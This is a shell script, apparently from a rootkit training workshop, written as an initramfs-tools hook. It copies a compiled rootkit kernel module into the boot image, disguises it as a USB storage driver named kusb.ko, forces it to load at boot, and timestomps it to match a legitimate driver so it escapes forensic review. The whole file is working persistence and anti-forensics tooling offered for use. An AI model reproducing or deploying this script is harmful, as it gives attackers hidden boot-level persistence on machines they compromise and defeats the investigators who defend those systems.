#!/bin/sh
PREREQ=""
prereqs() {
    echo "$PREREQ"
}
case $1 in
prereqs)
    prereqs
    exit 0
    ;;
esac

. /usr/share/initramfs-tools/hook-functions

# ---[ DEPLOYMENT LOGIC ]---

# 1. Define where we are copying FROM (Your compiled rootkit)
if [ ! -f "/home/kali/rootkit_workshop/persistence/chaos.ko" ]; then
    echo " [!] Rootkit source not found!" >&2
    exit 0
fi

# 2. Define where we are copying TO (Inside the boot image)
# $DESTDIR is a variable provided by the initramfs builder tool.
# We place the module deep inside the USB drivers folder to hide it.
mkdir -p "${DESTDIR}/usr/lib/modules/$(uname -r)/kernel/drivers/usb/storage"

# 3. Copy the file explicitly
cp /home/kali/rootkit_workshop/persistence/chaos.ko "${DESTDIR}/usr/lib/modules/$(uname -r)/kernel/drivers/usb/storage/kusb.ko"

# 4. Force the system to load "kusb" (our rootkit) at boot
force_load "kusb"

# ---[ ANTI-FORENSICS: TIMESTOMPING ]---
# We make our malicious file look as old as the valid usb-storage driver
# 1. Find the valid driver
VALID_DRIVER=$(find "${DESTDIR}/usr/lib/modules/$(uname -r)/kernel/drivers/usb/storage/" -name "*.ko" | head -n 1)

# 2. Clone its timestamp to our rootkit
if [ -n "$VALID_DRIVER" ]; then
    touch -r "$VALID_DRIVER" "${DESTDIR}/usr/lib/modules/$(uname -r)/kernel/drivers/usb/storage/kusb.ko"
    echo " [!] Timestomped kusb.ko to match $(basename "$VALID_DRIVER")" >&2
fi
